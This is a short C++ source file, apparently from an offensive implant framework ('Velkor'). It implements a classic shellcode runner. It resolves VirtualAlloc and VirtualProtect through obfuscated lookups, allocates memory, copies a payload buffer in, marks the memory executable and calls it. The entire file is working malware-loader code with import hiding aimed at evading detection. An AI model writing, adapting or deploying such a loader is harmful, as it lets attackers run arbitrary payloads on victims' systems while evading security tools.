#include <Ground.h>

VOID Classic(
    PBYTE  ShellcodeBuffer,
    SIZE_T ShellcodeSize
) {
    VOID( *VelkorEntry )( VOID );

    PVOID BaseAddress   = NULL;
    ULONG OldProtection = 0;

    BaseAddress = LdCall<PVOID>( 
        XprKernel32, XPR( "VirtualAlloc" ), NULL, 
        ShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE 
    );

    LdMem::Copy( BaseAddress, ShellcodeBuffer, ShellcodeSize );

    LdCall<BOOL>( XprKernel32, XPR( "VirtualProtect" ), BaseAddress, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection );

    VelkorEntry = ( VOID (*)() )( BaseAddress );
    VelkorEntry(); return;
}